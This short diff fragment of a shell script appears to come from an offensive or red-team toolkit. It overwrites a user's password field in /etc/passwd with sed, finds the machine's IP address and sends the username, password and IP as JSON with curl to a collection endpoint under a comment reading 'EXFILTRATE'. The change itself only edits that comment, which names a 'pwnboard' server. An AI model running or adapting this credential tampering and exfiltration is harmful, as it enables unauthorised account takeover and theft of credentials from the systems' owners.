@@ -75,6 +75,6 @@ sudo sed -i "s/^\($user:\)[^:]*:/\1$password:/" /etc/passwd
 
 ip_address=$(ip -4 addr show $(ip route | awk '/default/ {print $5; exit}') | awk '/inet/ {print $2}' | cut -d/ -f1) # see if this works durring deploy TODO, seems to work well
 
-#EXFILTRATE to pwnboard
+#EXFILTRATE 
 echo "DEBUG, sending this to the server" $user, $password, $ip_address 
 $(curl -s -X POST -H "Content-Type: application/json" -d "{\"ip\":\"$ip_address\",\"username\":\"$user\",\"password\":\"$password\"}" http://localhost:12345 >/dev/null 2>&1)
